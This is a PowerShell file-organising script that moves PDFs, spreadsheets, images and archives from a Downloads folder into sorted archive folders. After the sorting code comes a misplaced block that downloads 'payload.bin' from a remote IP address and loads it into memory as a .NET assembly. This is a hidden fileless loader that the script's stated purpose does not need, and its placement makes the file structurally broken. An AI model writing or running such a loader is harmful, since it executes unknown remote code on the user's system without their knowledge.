
$SourcePath      = "C:\Users\Public\Downloads"
$DestinationRoot = "D:\Archive\Sorted"
$LogPath         = 'C:\Logs\organise-2024-01-10.log'
$DryRun          = $false


$map = @{
    '.pdf'  = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.zip'  = 'Archives'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    Move-Item -LiteralPath $file.FullName -Destination $folder -WhatIf:$DryRun
}
Write-Host ("Processed {0} files" -f @($files).Count) -ForegroundColor Cyan
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://198.51.100.16/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($RemoteUrl)
[Reflection.Assembly]::Load($ManagedBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
